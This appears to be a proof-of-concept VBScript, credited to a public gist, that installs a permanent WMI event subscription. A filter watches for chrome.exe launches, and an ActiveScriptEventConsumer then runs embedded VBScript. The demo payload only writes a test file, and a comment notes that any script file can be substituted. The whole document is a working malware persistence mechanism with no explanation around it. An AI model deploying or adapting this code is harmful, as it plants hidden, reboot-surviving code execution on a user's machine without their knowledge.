' Based on https://gist.github.com/mgeeky/d00ba855d2af73fd8d7446df0f64c25a


Dim filterName, consumerName
Dim objLocator, serviceObj
Dim filterInstance, consumerInstance, filterToConsumerInstance
Dim filterObj, consumerObj, filterToConsumerObj

filterName = "BugSecFilter"
consumerName = "BugSecConsumer"

Set objLocator = CreateObject("WbemScripting.SWbemLocator")
Set serviceObj = objLocator.ConnectServer(".", "root\subscription")


' Step 1: Set WMI Instance of type Event Filter

Set filterInstance = serviceObj.Get("__EventFilter")

' New object of type __EventFilter
Set filterObj = filterInstance.Spawninstance_
filterObj.name = filterName
filterObj.eventNamespace = "root\cimv2"
filterObj.QueryLanguage = "WQL"
filterObj.query = "select * from __InstanceCreationEvent within 5 " _
                & "where targetInstance isa 'Win32_Process' " _
                & "and TargetInstance.Name = 'chrome.exe'"
filterObj.Put_

' Step 2: Set WMI instance of type: ActiveScriptEventConsumer

Set consumerInstance = serviceObj.Get("ActiveScriptEventConsumer")
Set consumerObj = consumerInstance.Spawninstance_
consumerObj.name = consumerName
consumerObj.scriptingEngine = "VBScript"
consumerObj.scriptText = "Dim fso, MyFile : Set fso = CreateObject(""Scripting.FileSystemObject"") : Set MyFile = fso.CreateTextFile(""c:\\WMI-Vbs-vbs.txt"", True) : MyFile.WriteLine(""test"") : MyFile.Close"
consumerObj.Put_

' alternativly we can point to a vbs script file
' consumerObj.scriptFilename = "c:\test.vbs"

' Step 3: Set WMI instance of type: Filter To Consumer Binding

Set filterToConsumerInstance = serviceObj.Get("__FilterToConsumerBinding")
Set filterToConsumerObj = filterToConsumerInstance.Spawninstance_
filterToConsumerObj.Filter = "__EventFilter.Name=""" & filterName & """"
filterToConsumerObj.Consumer = "ActiveScriptEventConsumer.Name=""" & consumerName & """"
filterToConsumerObj.Put_
